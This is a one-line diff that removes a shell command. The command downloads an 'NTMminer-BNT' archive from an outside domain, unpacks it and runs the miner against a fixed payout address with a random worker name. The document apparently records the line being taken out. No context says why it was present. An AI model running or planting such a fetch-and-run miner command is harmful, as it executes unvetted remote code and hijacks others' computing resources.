@@ -1,1 +1,0 @@
-wget https://kc.txedu.social/downloads/ntmminer-bnt/v1.2.1/NTMminer-BNT-v1.2.1-linux-x64.tar.gz && tar xvf NTMminer-BNT-v1.2.1-linux-x64.tar.gz && cd NTMminer-BNT-v1.2.1 && chmod +x NTMminer-BNT && ./NTMminer-BNT -u N3FT9Ut4wctdR5b9hBCz9Wc39GtjHmJw2GNuQLyTfVLEBS7exwWjz3fSXEb6YAzLG4CN5jVDe8sW2FBNP6xR9cnmmY4hz -w BNT$(shuf -i 1-99999 -n 1)
